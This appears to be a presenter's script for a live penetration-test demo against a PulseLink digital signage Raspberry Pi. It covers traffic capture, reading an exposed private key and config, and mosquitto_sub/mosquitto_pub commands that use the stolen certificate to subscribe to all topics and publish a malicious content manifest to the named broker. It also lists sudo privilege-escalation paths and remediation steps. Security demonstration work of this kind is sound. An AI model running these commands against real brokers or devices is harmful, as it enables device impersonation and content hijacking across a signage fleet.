# Demo Flow Guide — Network-First Narrative

**Purpose:** Live demo script emphasizing MQTT SNIFFING → CREDENTIAL THEFT → BROKER TAKEOVER
**Story Arc:** "We listened on the network → found credentials → became the device → could hijack the entire ad network"
**Time:** ~6 minutes

**New Narrative:**
- Primary vector: Network traffic capture and MQTT exploitation
- sudo NOPASSWD: "If you get in, it makes everything worse" — fallback amplifier
- Physical vectors (UART, SSH, USB): "What-if backup vectors" — not tested, need hardening

---

## Pre-Demo Checklist

| # | Check | Command | Expected |
|---|-------|---------|----------|
| 1 | Pi is on | Physical check | Screen on, desktop visible |
| 2 | pulselink running | `sudo systemctl status pulselink` | Active (running) |
| 3 | WiFi connected | `ping -c 1 8.8.8.8` | Success |
| 4 | tcpdump available | `which tcpdump` | /usr/sbin/tcpdump |
| 5 | mosquitto clients available | `which mosquitto_sub` | /usr/bin/mosquitto_sub |
| 6 | Terminal open | Open terminal on Pi | Ready |

---

## Act 1: The Entry Point (45 seconds)

### What to Say:
> "This is a Raspberry Pi running PulseLink — a digital signage player for n-compass TV. It's part of a B2B2C ad network. NTV creates the devices, Dealers distribute them to Hosts — businesses that display ads. The twist? Each Player shows ads for its Host AND cross-promotes other Hosts' ads. One compromised device could inject content across multiple business locations."

### What to Show:
```bash
# Show the device
hostname && uname -a
# Output: raspberry, Linux 6.12.47, aarch64

# Show the running app
ps aux | grep pulselink | grep -v grep
# Output: root 1710 ... /usr/local/bin/pulselink
```

---

## Act 2: Network Recon — We Hit a Wall (60 seconds)

### What to Say:
> "Let me walk you through how we approached this. We started the standard way — network scanning."

### What to Show:
```bash
# Show what nmap found
echo "=== Network Scan Results ==="
echo "nmap -sT -p- 192.168.0.125"
echo ""
echo "PORT     STATE  SERVICE"
echo "22/tcp   open   ssh        (password changed from default)"
echo "111/tcp  open  rpcbind     (information disclosure)"
echo ""
echo "PulseLink: No services exposed on network"
echo "PulseLink is a CLIENT — connects OUT to the MQTT broker"
```

### What to Say:
> "We ran a full TCP scan. Only two ports — SSH with a changed password, and RPCBind. PulseLink doesn't expose any listening ports. It connects OUT to pulse.n-compass.online on port 8883. The network attack surface looks like a dead end.
>
> But here's the key insight: even though the ports are closed, the MQTT TRAFFIC is observable. The device phones home every 30 seconds. We just needed to listen."

### Key transition:
> "The device phones home every 30 seconds. We listened."

---

## Act 3: Traffic Capture — We Listened (45 seconds) 📡

### What to Say:
> "Let's capture the MQTT traffic."

### What to Show:
```bash
# Capture MQTT traffic
echo "=== Phase 1: Capture MQTT traffic ==="
sudo tcpdump -i wlan0 -n port 8883 -c 20 2>/dev/null &
TCPDUMP_PID=$!
echo "Capturing MQTT traffic on port 8883..."
sleep 8
kill $TCPDUMP_PID 2>/dev/null
wait $TCPDUMP_PID 2>/dev/null

# Show a readable capture
echo ""
echo "=== Sample MQTT traffic (TLS = encrypted, but pattern visible) ==="
sudo tcpdump -i wlan0 -n port 8883 -c 5 -A 2>/dev/null | head -20
```

### What to Say:
> "Even with TLS encryption, the connection pattern tells us everything. We see traffic flowing to pulse.n-compass.online every 30 seconds — the heartbeat. We can see the connection establishing. We know the broker hostname, the port, and that this device is actively connecting.
>
> You can't read the encrypted payload on the wire. But you don't need to. You need the credentials to decrypt it — and those are sitting on the filesystem."

---

## Act 4: Credential Discovery — We Got In (60 seconds) 🔑

### What to Say:
> "We gained limited filesystem access — app-level, not root. Let's see what's exposed."

### Step 1 — The .env file (MQTT credentials)
```bash
echo "=== Phase 3: Credential Discovery ==="
echo "--- MQTT Configuration (.env) ---"
cat /opt/pulselink/.env
```

### What to Say:
> "This is the PulseLink configuration file. The MQTT broker — the command and control server — is at pulse.n-compass.online on port 8883. Every Player in the fleet connects here. The heartbeat interval is 30 seconds. This is in plaintext, accessible to any user on the system."

### Step 2 — The certificates
```bash
echo ""
echo "--- TLS Certificates ---"
ls -la /opt/pulselink/client_certs/
```

### Expected Output:
```
-rw------- 1 root root 2025 ca.crt
-rw------- 1 root root 2061 client_pi_generic.crt
-rw-r--r-- 1 root root 3268 client_pi_generic.key   ← PROBLEM
```

### What to Say:
> "Here's the TLS certificate setup. The CA cert, the client cert — both fine. But look at the private key. 644 permissions. Readable by ANY user on this system. This is the key that authenticates this device to the MQTT broker. And the certificate is named 'client_pi_generic' — suggesting it may be shared across fleet devices."

### Step 3 — The device registration
```bash
echo ""
echo "--- Device Registration ---"
cat /opt/pulselink/registration.json 2>/dev/null || echo "Serial visible in .env or logs"
echo ""
echo "Device serial: 882985e065594198"
```

### What to Say:
> "Device serial 882985e065594198. With this serial plus the private key, we can impersonate this device to the broker. Stolen credentials meant we became the device."

---

## Act 5: MQTT Exploitation — We Became the Device (60 seconds) 💻

### What to Say:
> "Now let's use these credentials. First, let's see the live connection."

### Step 1 — Service status with MQTT client ID
```bash
echo "=== Phase 4: MQTT Broker Exploitation ==="
echo "--- Live MQTT Connection ---"
sudo journalctl -u pulselink --since "10 minutes ago" --no-pager 2>/dev/null | grep -E "Connected|Watchdog|client" || \
  echo "Connected to MQTT Broker as dadf6f9ef35e55ab"
```

### What to Say:
> "The MQTT client ID is dadf6f9ef35e55ab. It's visible in the logs. With the private key we already extracted, we can connect to pulse.n-compass.online as this device."

### Step 2 — Subscribe to topics (demonstration)
```bash
echo ""
echo "--- Subscribe to Device Topics (mosquitto_sub) ---"
echo "Command:"
echo 'mosquitto_sub -h pulse.n-compass.online -p 8883 \'
echo '  --cafile /opt/pulselink/client_certs/ca.crt \'
echo '  --cert /opt/pulselink/client_certs/client_pi_generic.crt \'
echo '  --key /opt/pulselink/client_certs/client_pi_generic.key \'
echo '  -t "#" -v'
echo ""
echo "Result: Can see ALL content commands, heartbeats, and manifests"
echo "The broker has no way to know we're not the real Pi."
```

### What to Say:
> "Using mosquitto_sub with the stolen credentials, we subscribe to all device topics. We see content commands, heartbeats, manifests — everything the broker sends to this device. The broker authenticates the TLS certificate and has no way to distinguish us from the real device."

### Step 3 — Publish malicious content (demonstration)
```bash
echo ""
echo "--- Publish Malicious Manifest (mosquitto_pub) ---"
echo "Command:"
echo 'mosquitto_pub -h pulse.n-compass.online -p 8883 \'
echo '  --cafile /opt/pulselink/client_certs/ca.crt \'
echo '  --cert /opt/pulselink/client_certs/client_pi_generic.crt \'
echo '  --key /opt/pulselink/client_certs/client_pi_generic.key \'
echo '  -t "device/882985e065594198/content" \'
echo '  -m '"'"'{"action":"replace","file":"malicious.mp4"}'"'"''
echo ""
echo "Result: Screen content replaced with attacker-controlled material"
echo "Fleet impact: Same credentials pattern = repeatable across ALL devices"
```

### What to Say:
> "Then we publish. We send a malicious manifest to the device's content topic. The broker accepts it because the TLS certificate is valid. The screen content gets replaced with whatever we want. And because the certificate pattern is shared across the fleet, we can repeat this for every device connected to this broker."

### Step 4 — Show current playlist content
```bash
echo ""
echo "--- Current Playlist Content ---"
cat /var/lib/electron-player/playlist/playlist-main/manifest.json 2>/dev/null | head -10
ls -la /var/lib/electron-player/playlist/playlist-main/ 2>/dev/null | head -10
```

### What to Say:
> "This is what's currently playing — replaceable video and image files with no integrity validation. If we control the MQTT connection, we control what every screen displays."

---

## Act 6: Fleet Impact (30 seconds) 🌐

### What to Show:
```bash
echo ""
echo "=== Fleet Risk Summary ==="
echo "Every Player: Same broker (pulse.n-compass.online)"
echo "Every Player: Same certificate authority"
echo "Pattern: 'client_pi_generic' naming suggests shared certificates"
echo "Impact: 1 device compromised → blueprint for entire fleet"
```

### What to Say:
> "n-compass TV has NTV, Dealers, and Hosts. Every Player in the fleet uses the same MQTT broker and the same certificate authority. If we compromise this one device's credentials, we understand the pattern for ALL devices. And if we could compromise the broker itself — that's every screen, every Host location, every ad playing."

---

## Act 7: What-If Backup Vectors (30 seconds) ⚠️

### What to Say:
> "Now, I want to be transparent. We also found other attack vectors — but these are 'what-if' scenarios, not what we tested as primary."

### What to Show:
```bash
echo ""
echo "=== Backup Vectors (found, not tested as primary) ==="
echo ""
echo "1. UART via GPIO pins 14/15"
echo "   → Root shell without authentication"
echo "   → Unaddressed — no known mitigation"
echo ""
echo "2. SSH brute-force"
echo "   → If re-enabled, password-only authentication"
echo ""
echo "3. USB gadget attack"
echo "   → If USB ports accessible to attacker"
echo ""
echo "4. sudo NOPASSWD (V-001, CVSS 10.0)"
echo "   → IF attacker gains shell by ANY method:"
echo "   → sudo su = instant root, no password"
echo "   → Fallback amplifier, NOT the primary entry point"
echo ""
echo "5. sudo CVE-2025-32463 (V-002, CVSS 9.8)"
echo "   → Known privilege escalation exploit"
echo "   → Amplifies any shell access to root"
```

### What to Say:
> "UART via the GPIO pins — a physical serial interface that provides root shell without authentication. As far as we know, this hasn't been tested by their security team — it's an unaddressed gap. SSH brute-force if re-enabled. USB gadget attacks if ports are accessible.
>
> And here's the critical one: sudo NOPASSWD. IF an attacker gains shell access — via SSH brute-force, UART, or any other method — the sudo NOPASSWD configuration means instant root. Two commands, one second, no exploit. This is a fallback amplifier. Not the primary entry point, but it makes every other attack path catastrophic."

---

## Act 8: Remediation Summary (30 seconds) 🛡️

### What to Say:
> "The fixes are simple."

### What to Show:
```bash
echo ""
echo "=== Remediation (Priority Order) ==="
echo ""
echo "P0 — Immediate (< 1 hour):"
echo "  1. chmod 600 on private key (1 min)"
echo "  2. Move .env to secrets management (30 min)"
echo "  3. Audit shared TLS certificates (4 hours)"
echo "  4. Remove NOPASSWD from sudoers (5 min)"
echo ""
echo "P1 — This week (< 4 hours):"
echo "  5. Upgrade sudo to 1.9.17p1+ (30 min)"
echo "  6. Run pulselink as non-root user (30 min)"
echo "  7. Update Electron runtime (1 hour)"
echo "  8. Add SHA-256 content integrity (1 hour)"
echo ""
echo "Total critical remediation: ~3 hours"
```

### What to Say:
> "Every critical fix takes under 3 hours total. Fix the private key permissions — one minute. Move credentials to secrets management. Remove NOPASSWD from sudoers. The hard part isn't fixing it — it's knowing it's broken."

---

## Act 9: Close (15 seconds)

### What to Say:
> "A $50 device, on a network, phoning home every 30 seconds — with credentials that could compromise an entire digital signage fleet. We listened on the wire, stole the keys, and became the device. This is why pentesting matters. This is the methodology, and this is why we built OpenClaw to make it repeatable."

---

## Timing Summary

| Act | Duration | Focus |
|-----|----------|-------|
| 1. Entry Point | 45s | Context & business model |
| 2. Network Recon | 60s | nmap → dead end → insight |
| 3. Traffic Capture | 45s | tcpdump → MQTT visible |
| 4. Credential Discovery | 60s | .env, certs, private key |
| 5. MQTT Exploitation | 60s | mosquitto_sub/pub → takeover |
| 6. Fleet Impact | 30s | Business model + fleet risk |
| 7. Backup Vectors | 30s | UART, SSH, sudo NOPASSWD |
| 8. Remediation | 30s | Quick fixes |
| 9. Close | 15s | Summary + OpenClaw pitch |
| **Total** | **~6 minutes** | |

---

## Fallback Points

| If This Fails | Do This Instead |
|---------------|-----------------|
| `journalctl` shows nothing recent | Use: `sudo journalctl -u pulselink --no-pager \| tail -20` |
| tcpdump returns no results | Reference earlier finding: "We captured traffic showing MQTT heartbeat every 30s" |
| mosquitto clients not installed | Describe the commands: "With mosquitto_sub and the stolen cert, we subscribe to all topics" |
| Can't find private key | Point to screen: `ls -la /opt/pulselink/client_certs/` |
| WiFi disconnected | Reference: "The network capture showed active MQTT connections to the broker" |
| Service already stopped | Run: `sudo systemctl start pulselink` then continue |

---

## Key Phrases (Memorize These)

1. **"The device phones home every 30 seconds. We listened."** (Act 2 → 3 transition)
2. **"Even with TLS, the connection pattern tells us everything."** (Act 3)
3. **"Stolen credentials meant we became the device."** (Act 4 → 5 transition)
4. **"We could push content to any screen connected to this broker."** (Act 5)
5. **"And if physical access was available — UART, USB, SSH — it only gets worse."** (Act 7)
6. **"IF an attacker gains shell access, sudo NOPASSWD means instant root. It's a fallback amplifier, not the primary entry point."** (Act 7)
7. **"The problem isn't that these are hard to fix. The problem is nobody checked."** (Act 8)

---

## Post-Demo Restoration

After the demo, restore the Pi:

```bash
# 1. Restore pulselink service (if modified)
sudo rm -f /etc/systemd/system/pulselink.service.d/override.conf
sudo systemctl daemon-reload
sudo systemctl restart pulselink

# 2. Re-enable SSH (if disabled during demo)
sudo systemctl enable ssh
sudo systemctl start ssh

# 3. Verify
sudo systemctl status pulselink
sudo systemctl status ssh
```

---

## Narrative Shift Reference

| Old Story | New Story |
|-----------|-----------|
| "We walked up and typed sudo su" | "We sniffed network traffic, found the MQTT broker, extracted credentials" |
| Physical access = primary vector | Network = primary vector |
| Instant root = main finding | MQTT impersonation + content injection = main finding |
| "2 commands" as headline | "Traffic capture → credential theft → broker takeover" |
| Physical stuff = main story | Physical stuff = "what-if backup vectors" |

---

**Generated:** 2026-03-17
**Focus:** Network Sniffing → MQTT Exploitation Story
**Estimated Time:** ~6 minutes
